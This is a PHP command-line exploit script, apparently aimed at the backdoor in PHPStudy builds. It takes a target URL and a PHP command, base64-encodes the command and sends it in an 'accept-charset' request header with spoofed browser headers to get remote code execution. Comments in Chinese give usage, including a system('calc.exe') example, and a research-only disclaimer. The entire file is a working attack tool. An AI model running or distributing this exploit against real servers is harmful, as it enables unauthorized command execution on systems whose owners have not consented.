<?php
/**
 * PHPStudy 漏洞执行工具
 * 本代码由 心语难诉 <wigiesen.cn@gmail> 编写
 * 本文件仅限研究使用,切勿用于非法用途!
 * 使用本文件造成的任何后果, 本作者一概不承担任何法律责任！
 * 使用方法(必须以命令行执行)：
 * php backdoor.php -u "目标服务器地址任意php文件" -c "执行命令"
 * eg:
 * php backdoor.php -u "http://127.0.0.1/index.php" -c "system('calc.exe');"
 */
header("Content-type:text/html;charset=utf-8");
function Request($url, $headers)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

$params = getopt('u:c:');
if (@!$params['u'] || @!$params['c']) {
    echo "url和参数不可为空！\r\n";
    exit;
}else{
    $url     = $params['u'];
    $command = base64_encode($params['c']);
}
$result = Request($url, [
    'User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 Edg/77.0.235.27',
    'Sec-Fetch-Mode:navigate',
    'Sec-Fetch-User:?1',
    'Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'Sec-Fetch-Site:none',
    "accept-charset:{$command}",
    'Accept-Encoding:gzip,deflate',
    'Accept-Language:zh-CN,zh;q=0.9'
]);

print_r($result);